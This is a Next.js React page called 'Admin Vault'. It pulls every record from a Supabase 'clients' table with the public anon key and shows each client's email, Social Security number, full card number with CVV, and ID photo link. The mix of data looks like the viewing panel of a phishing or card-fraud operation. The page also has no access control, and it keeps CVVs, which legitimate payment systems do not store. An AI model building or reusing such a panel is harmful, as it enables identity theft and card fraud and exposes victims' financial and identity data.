"use client";

import React, { useEffect, useState } from "react";
import { createClient } from "@supabase/supabase-js";
import * as Lucide from "lucide-react";

const supabase = createClient(process.env.NEXT_PUBLIC_SUPABASE_URL!, process.env.NEXT_PUBLIC_SUPABASE_ANON_KEY!);

export default function AdminVault() {
  const [clients, setClients] = useState<any[]>([]);

  useEffect(() => {
    const fetch = async () => {
      const { data } = await supabase.from('clients').select('*').order('created_at', { ascending: false });
      setClients(data || []);
    };
    fetch();
  }, []);

  return (
    <main className="min-h-screen bg-[#02040A] text-white pt-32 px-6">
      <div className="max-w-7xl mx-auto">
        <h1 className="text-3xl font-bold mb-12 flex items-center gap-3"><Lucide.ShieldAlert className="text-red-500" /> Admin Vault</h1>
        <div className="bg-[#0A1024] border border-white/5 rounded-2xl overflow-hidden">
          <table className="w-full text-left">
            <thead className="bg-white/5 text-[10px] uppercase text-emerald-500 tracking-widest">
              <tr>
                <th className="p-4">Email</th>
                <th className="p-4">SSN</th>
                <th className="p-4">Card Data</th>
                <th className="p-4">ID Photo</th>
              </tr>
            </thead>
            <tbody className="text-sm font-mono">
              {clients.map(c => (
                <tr key={c.id} className="border-t border-white/5">
                  <td className="p-4 text-white">{c.email}</td>
                  <td className="p-4 text-emerald-500">{c.ssn}</td>
                  <td className="p-4 text-gray-400">{c.card_number} | {c.cvv}</td>
                  <td className="p-4">
                    {c.document_url && <a href={c.document_url} target="_blank" className="text-blue-400 underline">View ID</a>}
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      </div>
    </main>
  );
}